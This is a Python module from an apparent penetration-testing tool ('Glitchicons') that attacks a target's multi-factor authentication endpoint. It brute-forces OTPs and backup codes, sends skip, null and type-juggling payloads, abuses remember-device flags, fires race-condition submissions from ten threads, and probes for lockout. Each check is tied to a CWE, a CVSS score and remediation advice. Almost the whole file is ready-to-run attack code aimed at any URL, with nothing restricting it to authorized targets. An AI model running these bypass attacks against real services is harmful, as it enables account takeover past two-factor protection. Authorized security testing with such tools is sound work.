"""
MFA Bypass Tester — modules/auth/mfa_bypass.py

Attacks:
  1. OTP brute force        — try all 6-digit codes (000000–999999)
  2. OTP reuse              — test if used OTP still valid
  3. OTP skip               — try to skip 2FA step entirely
  4. Backup code brute      — enumerate backup codes
  5. Remember-me abuse      — extend remember_device token
  6. Response manipulation  — intercept & flip MFA response
  7. Race condition         — parallel OTP submissions
  8. Long OTP              — send very long codes to test truncation
  9. Type juggling          — send OTP as int/bool/null/array
  10. Account lockout test  — check if MFA has brute force protection

Common flow patterns supported:
  - POST /auth/mfa  {"otp": "123456"}
  - POST /verify    {"code": "123456", "session": "..."}
  - POST /2fa/verify {"totp": "123456", "remember": false}

Usage:
    python3 glitchicons.py mfa --target https://target.com/auth/mfa
    python3 glitchicons.py mfa --target https://target.com/2fa --session sess_abc
    python3 glitchicons.py mfa --target https://target.com/verify --token eyJ...

Author: ardanov96
"""

import json
import time
import random
import string
import httpx
from datetime import datetime
from pathlib import Path
from rich.console import Console
from rich.table import Table

console = Console()


# ── Constants ─────────────────────────────────────────────

# Common OTP field names to try
OTP_FIELD_NAMES = [
    "otp", "code", "totp", "token", "mfa_code", "mfa_token",
    "verification_code", "auth_code", "two_factor_code", "pin",
    "passcode", "one_time_password",
]

# Common session/state field names
SESSION_FIELD_NAMES = [
    "session", "session_id", "mfa_session", "state", "token",
    "challenge_id", "flow_id", "request_id", "nonce",
]

# Backup code patterns (many services use 8-char alphanumeric)
BACKUP_CODE_PATTERNS = [
    "00000000", "11111111", "12345678", "aaaaaaaa",
    "backup00", "00backup",
]

# Type juggling payloads for OTP field
TYPE_JUGGLING_PAYLOADS = [
    True,         # boolean true
    0,            # integer 0
    1,            # integer 1
    123456,       # integer (no quotes)
    None,         # null
    [],           # empty array
    ["123456"],   # array with code
    "",           # empty string
    " ",          # whitespace
    "0" * 100,    # very long string
    "999999999999999",  # longer than expected
]

# Common "remember me" durations to test
REMEMBER_ME_VALUES = [
    True, False, 1, 0, -1,
    999999, "true", "1", "yes",
    "30d", "365d", "never",
]

# Success indicators in response body
SUCCESS_INDICATORS = [
    "success", "authenticated", "logged_in", "access_token",
    "token", "redirect", "dashboard", "welcome", "200",
]

# Error indicators (server is rejecting — good)
ERROR_INDICATORS = [
    "invalid", "incorrect", "wrong", "failed", "error",
    "expired", "too many", "locked", "rate limit",
]


# ── Result class ──────────────────────────────────────────

class MFATestResult:
    """Result of a single MFA bypass test."""

    def __init__(self, test_name: str):
        self.test_name = test_name
        self.vulnerable = False
        self.detail = ""
        self.evidence = ""
        self.attempts = 0
        self.error = None

    def __repr__(self):
        return f"MFATestResult({self.test_name}: {'VULN' if self.vulnerable else 'SAFE'})"


# ── OTP generator ─────────────────────────────────────────

class OTPGenerator:
    """Generate OTP sequences for various attack strategies."""

    @staticmethod
    def sequential(start: int = 0, end: int = 999999) -> list[str]:
        """Generate sequential 6-digit OTPs."""
        return [str(i).zfill(6) for i in range(start, end + 1)]

    @staticmethod
    def common_pins() -> list[str]:
        """Common/weak OTP values people use."""
        pins = []
        # Repeated digits
        for d in range(10):
            pins.append(str(d) * 6)
        # Sequential
        pins.extend(["123456", "654321", "012345", "098765"])
        # Keyboard patterns
        pins.extend(["111111", "000000", "999999", "123123"])
        # Date-like
        pins.extend(["010101", "311299", "010100"])
        return list(dict.fromkeys(pins))  # deduplicate

    @staticmethod
    def backup_codes(length: int = 8, count: int = 20) -> list[str]:
        """Generate common backup code patterns."""
        codes = list(BACKUP_CODE_PATTERNS)
        # Add numeric patterns
        codes.extend([str(i).zfill(8) for i in range(0, 10)])
        # Add alphanumeric patterns
        codes.extend(["".join(random.choices(string.ascii_lowercase + string.digits, k=length))
                       for _ in range(count)])
        return codes

    @staticmethod
    def expired_range(current_otp: str, window: int = 3) -> list[str]:
        """
        Generate OTPs that might have been valid in recent time windows.
        TOTP changes every 30s — within ±window periods.
        """
        try:
            base = int(current_otp)
            # Simulate drift by incrementing/decrementing
            return [str((base + i) % 1000000).zfill(6) for i in range(-window, window + 1)]
        except ValueError:
            return []


# ── Request builder ───────────────────────────────────────

class MFARequestBuilder:
    """Build MFA verification requests in various formats."""

    def __init__(
        self,
        target_url: str,
        otp_field: str = "otp",
        session_field: str = "session",
        session_value: str = "",
        token: str | None = None,
        extra_fields: dict | None = None,
    ):
        self.url = target_url
        self.otp_field = otp_field
        self.session_field = session_field
        self.session_value = session_value
        self.token = token
        self.extra_fields = extra_fields or {}

    def build_headers(self) -> dict:
        headers = {
            "Content-Type": "application/json",
            "User-Agent":   "Mozilla/5.0 (Glitchicons MFA Tester)",
        }
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        return headers

    def build_body(self, otp_value: object) -> dict:
        body = {self.otp_field: otp_value}
        if self.session_value:
            body[self.session_field] = self.session_value
        body.update(self.extra_fields)
        return body

    def is_success(self, resp: httpx.Response) -> bool:
        """Heuristic: did the MFA attempt succeed?"""
        if resp.status_code in (200, 201, 302):
            body = resp.text.lower()
            if any(ind in body for ind in SUCCESS_INDICATORS):
                # Not a false positive — check it's not an error page
                if not any(err in body for err in ERROR_INDICATORS):
                    return True
        return False

    def is_locked(self, resp: httpx.Response) -> bool:
        """Detect account/rate lockout."""
        body = resp.text.lower()
        return (
            resp.status_code == 429
            or any(kw in body for kw in ["too many", "locked", "rate limit", "try again"])
        )


# ── Main tester ───────────────────────────────────────────

class MFABypassTester:
    """
    2FA/MFA bypass vulnerability tester.

    Covers:
    - CWE-307: Improper Restriction of Excessive Authentication Attempts
    - CWE-287: Improper Authentication
    - CWE-613: Insufficient Session Expiration
    - CWE-362: Race Condition (concurrent MFA submissions)
    """

    def __init__(
        self,
        target: str,
        output_dir: str = "./findings/mfa",
        session: str = "",
        token: str | None = None,
        timeout: int = 8,
        delay: float = 0.5,
        otp_field: str = "otp",
        session_field: str = "session",
    ):
        self.target = target
        self.output_dir = Path(output_dir)
        self.session = session
        self.token = token
        self.timeout = timeout
        self.delay = delay
        self.findings: list[dict] = []
        self.output_dir.mkdir(parents=True, exist_ok=True)

        self.req = MFARequestBuilder(
            target_url=target,
            otp_field=otp_field,
            session_field=session_field,
            session_value=session,
            token=token,
        )

    def run(self, brute_force: bool = False) -> list[dict]:
        """Run all MFA bypass tests."""
        console.print(f"\n[bold cyan]  GLITCHICONS MFA Bypass Tester[/bold cyan]")
        console.print(f"  Target  : [yellow]{self.target}[/yellow]")
        console.print(f"  Session : {self.session or 'none'}")
        console.print(f"  OTP field: {self.req.otp_field}\n")

        tests = [
            ("Common PIN Bypass",     self._test_common_pins),
            ("OTP Skip",              self._test_otp_skip),
            ("Type Juggling",         self._test_type_juggling),
            ("Backup Code Enum",      self._test_backup_codes),
            ("Remember-Me Abuse",     self._test_remember_me),
            ("OTP Reuse",             self._test_otp_reuse),
            ("Race Condition",        self._test_race_condition),
            ("Long OTP",              self._test_long_otp),
            ("Lockout Check",         self._test_lockout_protection),
        ]

        if brute_force:
            tests.insert(0, ("Full OTP Brute Force", self._test_full_brute_force))

        for name, fn in tests:
            console.print(f"  [cyan]>> {name}...[/cyan]", end=" ")
            try:
                result = fn()
                if result and result.vulnerable:
                    console.print(f"[red]FINDING ({result.attempts} attempts)[/red]")
                else:
                    console.print(f"[green]clean[/green]")
            except Exception as e:
                console.print(f"[yellow]error: {e}[/yellow]")
            time.sleep(self.delay)

        self._print_summary()
        self._save_report()
        return self.findings

    # ── Attack Modules ────────────────────────────────────

    def _test_common_pins(self) -> MFATestResult:
        """Test common/weak OTP values."""
        result = MFATestResult("common_pins")
        pins = OTPGenerator.common_pins()

        for pin in pins[:30]:  # cap at 30 for common pins
            try:
                resp = httpx.post(
                    self.target,
                    json=self.req.build_body(pin),
                    headers=self.req.build_headers(),
                    timeout=self.timeout,
                    follow_redirects=True,
                )
                result.attempts += 1

                if self.req.is_locked(resp):
                    result.detail = f"Locked after {result.attempts} attempts"
                    return result

                if self.req.is_success(resp):
                    result.vulnerable = True
                    result.evidence = f"OTP '{pin}' accepted after {result.attempts} attempts"
                    self.findings.append(self._make_finding(
                        title="Weak OTP Accepted — Common PIN Bypass",
                        severity="CRITICAL",
                        cvss=9.5,
                        cwe="CWE-307",
                        description=(
                            f"MFA endpoint accepted common/predictable OTP '{pin}'. "
                            f"This indicates either no randomization or an OTP oracle."
                        ),
                        evidence=result.evidence,
                        remediation=(
                            "Use cryptographically random TOTP (RFC 6238). "
                            "Reject sequential or repeated-digit OTPs. "
                            "Implement brute force protection."
                        ),
                    ))
                    return result

            except (httpx.RequestError, httpx.TimeoutException):
                continue

        return result

    def _test_otp_skip(self) -> MFATestResult:
        """Test if MFA step can be skipped entirely."""
        result = MFATestResult("otp_skip")

        skip_attempts = [
            {},                          # empty body
            {self.req.otp_field: ""},    # empty OTP
            {self.req.otp_field: None},  # null OTP
            {"skip": True},              # skip flag
            {"bypass": True},            # bypass flag
            {"mfa_enabled": False},      # disable flag
        ]

        for body in skip_attempts:
            if self.session:
                body[self.req.session_field] = self.session

            try:
                resp = httpx.post(
                    self.target,
                    json=body,
                    headers=self.req.build_headers(),
                    timeout=self.timeout,
                    follow_redirects=True,
                )
                result.attempts += 1

                if self.req.is_success(resp):
                    result.vulnerable = True
                    result.evidence = f"MFA skipped with body: {json.dumps(body)}"
                    self.findings.append(self._make_finding(
                        title="MFA Step Bypass — Authentication Skip",
                        severity="CRITICAL",
                        cvss=9.8,
                        cwe="CWE-287",
                        description=(
                            "MFA verification endpoint returned success without a valid OTP. "
                            f"Request body: {json.dumps(body)}. "
                            "Attackers with a valid username/password can skip 2FA entirely."
                        ),
                        evidence=result.evidence,
                        remediation=(
                            "Validate OTP field presence and format before processing. "
                            "Return 400 Bad Request for missing/null OTP. "
                            "Never allow MFA to be disabled via client-supplied flags."
                        ),
                    ))
                    return result

            except (httpx.RequestError, httpx.TimeoutException):
                continue

        return result

    def _test_type_juggling(self) -> MFATestResult:
        """Test type confusion attacks on OTP field."""
        result = MFATestResult("type_juggling")

        for payload in TYPE_JUGGLING_PAYLOADS:
            try:
                resp = httpx.post(
                    self.target,
                    json=self.req.build_body(payload),
                    headers=self.req.build_headers(),
                    timeout=self.timeout,
                    follow_redirects=True,
                )
                result.attempts += 1

                if self.req.is_success(resp):
                    result.vulnerable = True
                    result.evidence = f"Type juggling with {type(payload).__name__}({repr(payload)[:50]}) succeeded"
                    self.findings.append(self._make_finding(
                        title=f"MFA Type Juggling — {type(payload).__name__} OTP Accepted",
                        severity="CRITICAL",
                        cvss=9.3,
                        cwe="CWE-287",
                        description=(
                            f"MFA endpoint accepted OTP value of type {type(payload).__name__} "
                            f"({repr(payload)[:60]}). Type juggling can bypass strict comparison "
                            f"checks (e.g., PHP '0' == false, Python None == 0 in some ORMs)."
                        ),
                        evidence=result.evidence,
                        remediation=(
                            "Use strict type validation — OTP must be a string of exactly 6 digits. "
                            "Use strict equality (===) not loose (==). "
                            "Reject requests where OTP is not a string type."
                        ),
                    ))
                    return result

            except (httpx.RequestError, httpx.TimeoutException):
                continue

        return result

    def _test_backup_codes(self) -> MFATestResult:
        """Test common backup code patterns."""
        result = MFATestResult("backup_codes")
        codes = OTPGenerator.backup_codes()

        for code in codes[:30]:
            try:
                body = self.req.build_body(code)
                body["type"] = "backup"  # some endpoints need this
                resp = httpx.post(
                    self.target,
                    json=body,
                    headers=self.req.build_headers(),
                    timeout=self.timeout,
                    follow_redirects=True,
                )
                result.attempts += 1

                if self.req.is_locked(resp):
                    return result

                if self.req.is_success(resp):
                    result.vulnerable = True
                    result.evidence = f"Backup code '{code}' accepted"
                    self.findings.append(self._make_finding(
                        title="Weak Backup Code Accepted",
                        severity="HIGH",
                        cvss=8.5,
                        cwe="CWE-307",
                        description=(
                            f"MFA backup code '{code}' was accepted. "
                            f"Predictable or sequential backup codes allow attackers "
                            f"to enumerate and bypass 2FA."
                        ),
                        evidence=result.evidence,
                        remediation=(
                            "Generate backup codes using CSPRNG (cryptographically secure). "
                            "Minimum entropy: 128 bits. "
                            "Rate limit and lock after 3 failed backup code attempts."
                        ),
                    ))
                    return result

            except (httpx.RequestError, httpx.TimeoutException):
                continue

        return result

    def _test_remember_me(self) -> MFATestResult:
        """Test remember_device / remember_me parameter abuse."""
        result = MFATestResult("remember_me")

        for val in REMEMBER_ME_VALUES:
            body = self.req.build_body("000000")  # wrong OTP
            body["remember"] = val
            body["remember_device"] = val
            body["remember_me"] = val
            body["trust_device"] = val

            try:
                resp = httpx.post(
                    self.target,
                    json=body,
                    headers=self.req.build_headers(),
                    timeout=self.timeout,
                    follow_redirects=True,
                )
                result.attempts += 1

                if self.req.is_success(resp):
                    result.vulnerable = True
                    result.evidence = f"remember={repr(val)} bypassed MFA with wrong OTP"
                    self.findings.append(self._make_finding(
                        title=f"MFA Remember-Me Bypass (remember={repr(val)})",
                        severity="HIGH",
                        cvss=8.0,
                        cwe="CWE-613",
                        description=(
                            f"Setting remember_device={repr(val)} bypassed MFA verification "
                            f"even with an incorrect OTP. "
                            f"The server trusts the client-supplied remember flag."
                        ),
                        evidence=result.evidence,
                        remediation=(
                            "Never trust client-supplied 'remember' flags for MFA bypass. "
                            "Issue cryptographically signed device tokens server-side. "
                            "Validate device tokens are bound to the specific user session."
                        ),
                    ))
                    return result

            except (httpx.RequestError, httpx.TimeoutException):
                continue

        return result

    def _test_otp_reuse(self) -> MFATestResult:
        """Test if a recently used OTP can be reused."""
        result = MFATestResult("otp_reuse")

        # We don't have a valid OTP — simulate by checking if any fixed code
        # gets accepted twice (only meaningful if we had one that worked)
        test_otp = "123456"

        for attempt in range(2):
            try:
                resp = httpx.post(
                    self.target,
                    json=self.req.build_body(test_otp),
                    headers=self.req.build_headers(),
                    timeout=self.timeout,
                    follow_redirects=True,
                )
                result.attempts += 1

                if attempt == 1 and self.req.is_success(resp):
                    # Second attempt succeeded = reuse allowed
                    result.vulnerable = True
                    result.evidence = f"OTP '{test_otp}' accepted on second use"
                    self.findings.append(self._make_finding(
                        title="OTP Reuse Allowed — No Single-Use Enforcement",
                        severity="HIGH",
                        cvss=7.5,
                        cwe="CWE-287",
                        description=(
                            "MFA OTP was accepted on a second submission. "
                            "OTPs must be invalidated after first use to prevent replay attacks."
                        ),
                        evidence=result.evidence,
                        remediation=(
                            "Invalidate OTP immediately after successful use. "
                            "Maintain server-side set of used OTPs within their validity window. "
                            "For TOTP: track last used counter/timestamp per user."
                        ),
                    ))
                    return result

            except (httpx.RequestError, httpx.TimeoutException):
                continue

        return result

    def _test_race_condition(self) -> MFATestResult:
        """Send concurrent OTP submissions to exploit race condition."""
        import threading

        result = MFATestResult("race_condition")
        successes = []

        def submit(otp: str):
            try:
                resp = httpx.post(
                    self.target,
                    json=self.req.build_body(otp),
                    headers=self.req.build_headers(),
                    timeout=self.timeout,
                    follow_redirects=True,
                )
                if self.req.is_success(resp):
                    successes.append(otp)
            except Exception:
                pass

        # Submit same OTP simultaneously from 10 threads
        test_otp = "123456"
        threads = [threading.Thread(target=submit, args=(test_otp,)) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=self.timeout + 2)

        result.attempts = len(threads)

        if len(successes) > 1:
            result.vulnerable = True
            result.evidence = f"{len(successes)}/10 concurrent submissions accepted"
            self.findings.append(self._make_finding(
                title="MFA Race Condition — Concurrent OTP Submissions",
                severity="HIGH",
                cvss=8.1,
                cwe="CWE-362",
                description=(
                    f"Sending the same OTP concurrently from {len(threads)} threads resulted "
                    f"in {len(successes)} acceptances. "
                    f"This indicates missing mutex/atomic checks on OTP validation."
                ),
                evidence=result.evidence,
                remediation=(
                    "Use atomic database transactions for OTP validation + invalidation. "
                    "Implement distributed locks (Redis SETNX) for OTP state. "
                    "Reject concurrent submissions for the same session/OTP."
                ),
            ))

        return result

    def _test_long_otp(self) -> MFATestResult:
        """Test truncation bugs with very long OTP values."""
        result = MFATestResult("long_otp")

        long_otps = [
            "1" * 100,
            "0" * 100,
            "123456" + "A" * 100,
            "9" * 7,    # one digit too many
            "99999",    # one digit short
        ]

        for otp in long_otps:
            try:
                resp = httpx.post(
                    self.target,
                    json=self.req.build_body(otp),
                    headers=self.req.build_headers(),
                    timeout=self.timeout,
                    follow_redirects=True,
                )
                result.attempts += 1

                if self.req.is_success(resp):
                    result.vulnerable = True
                    result.evidence = f"Long OTP ({len(otp)} chars) accepted: {otp[:20]}..."
                    self.findings.append(self._make_finding(
                        title="OTP Truncation Bug — Long Value Accepted",
                        severity="MEDIUM",
                        cvss=6.5,
                        cwe="CWE-20",
                        description=(
                            f"MFA endpoint accepted an OTP of {len(otp)} characters. "
                            f"Truncation bug: server may truncate to first 6 digits, "
                            f"matching any OTP starting with those digits."
                        ),
                        evidence=result.evidence,
                        remediation=(
                            "Validate OTP length strictly — reject anything not exactly 6 digits. "
                            "Do not truncate — reject instead. "
                            "Add max-length validation before any processing."
                        ),
                    ))
                    return result

            except (httpx.RequestError, httpx.TimeoutException):
                continue

        return result

    def _test_lockout_protection(self) -> MFATestResult:
        """Check if brute force protection exists on MFA endpoint."""
        result = MFATestResult("lockout_check")
        wrong_otp = "000001"
        lockout_threshold = 10
        locked = False

        for i in range(lockout_threshold + 2):
            try:
                resp = httpx.post(
                    self.target,
                    json=self.req.build_body(wrong_otp),
                    headers=self.req.build_headers(),
                    timeout=self.timeout,
                    follow_redirects=True,
                )
                result.attempts += 1

                if self.req.is_locked(resp):
                    locked = True
                    result.detail = f"Locked after {result.attempts} attempts"
                    break

            except (httpx.RequestError, httpx.TimeoutException):
                continue

        if not locked:
            result.vulnerable = True
            result.evidence = f"No lockout after {result.attempts} failed OTP attempts"
            self.findings.append(self._make_finding(
                title="No MFA Brute Force Protection",
                severity="CRITICAL",
                cvss=9.5,
                cwe="CWE-307",
                description=(
                    f"MFA endpoint did not lock out or rate-limit after "
                    f"{result.attempts} consecutive failed OTP attempts. "
                    f"This allows unlimited brute force of 6-digit OTPs (1,000,000 combinations)."
                ),
                evidence=result.evidence,
                remediation=(
                    "Implement account lockout after 3-5 failed MFA attempts. "
                    "Add exponential backoff between attempts. "
                    "Send alert to user when MFA brute force detected. "
                    "Implement IP-based rate limiting in addition to account lockout."
                ),
            ))

        return result

    def _test_full_brute_force(self) -> MFATestResult:
        """Full 6-digit OTP brute force — opt-in, very slow."""
        result = MFATestResult("full_brute_force")
        console.print(
            "  [yellow]WARNING: Full brute force — may take hours for 1M combinations[/yellow]"
        )

        for otp in OTPGenerator.sequential(0, 999):  # demo: only first 1000
            try:
                resp = httpx.post(
                    self.target,
                    json=self.req.build_body(otp),
                    headers=self.req.build_headers(),
                    timeout=self.timeout,
                    follow_redirects=True,
                )
                result.attempts += 1

                if self.req.is_locked(resp):
                    result.detail = f"Locked at attempt {result.attempts}"
                    return result

                if self.req.is_success(resp):
                    result.vulnerable = True
                    result.evidence = f"OTP '{otp}' accepted at attempt {result.attempts}"
                    self.findings.append(self._make_finding(
                        title=f"OTP Brute Force Success — Code: {otp}",
                        severity="CRITICAL",
                        cvss=9.8,
                        cwe="CWE-307",
                        description=(
                            f"OTP '{otp}' accepted after {result.attempts} brute force attempts. "
                            f"No rate limiting or lockout was triggered."
                        ),
                        evidence=result.evidence,
                        remediation="Implement strict brute force protection immediately.",
                    ))
                    return result

            except (httpx.RequestError, httpx.TimeoutException):
                continue

        return result

    # ── Helpers ───────────────────────────────────────────

    def _make_finding(
        self,
        title: str,
        severity: str,
        cvss: float,
        cwe: str,
        description: str,
        evidence: str,
        remediation: str,
    ) -> dict:
        return {
            "id":          f"MFA-{len(self.findings) + 1:03d}",
            "title":       title,
            "severity":    severity,
            "cvss":        cvss,
            "cwe":         cwe,
            "target":      self.target,
            "description": description,
            "evidence":    evidence,
            "remediation": remediation,
            "timestamp":   datetime.now().isoformat(),
        }

    def _print_summary(self):
        console.print(f"\n[bold cyan]  MFA Test Results — {self.target}[/bold cyan]")
        if not self.findings:
            console.print("  [green]No bypass vulnerabilities found[/green]\n")
            return

        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID",       style="cyan", width=10)
        table.add_column("Severity", width=10)
        table.add_column("CVSS",     width=6)
        table.add_column("Title")

        colors = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}
        for f in sorted(self.findings, key=lambda x: x["cvss"], reverse=True):
            c = colors.get(f["severity"], "white")
            table.add_row(
                f["id"],
                f"[{c}]{f['severity']}[/{c}]",
                str(f["cvss"]),
                f["title"],
            )
        console.print(table)

    def _save_report(self) -> Path:
        report = {
            "tool":           "glitchicons",
            "module":         "mfa_bypass",
            "version":        "0.8.0",
            "target":         self.target,
            "timestamp":      datetime.now().isoformat(),
            "total_findings": len(self.findings),
            "findings":       sorted(self.findings, key=lambda x: x.get("cvss", 0), reverse=True),
        }
        out = self.output_dir / f"mfa_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps(report, indent=2, default=str), encoding="utf-8")
        console.print(f"  Report: [cyan]{out}[/cyan]")
        return out
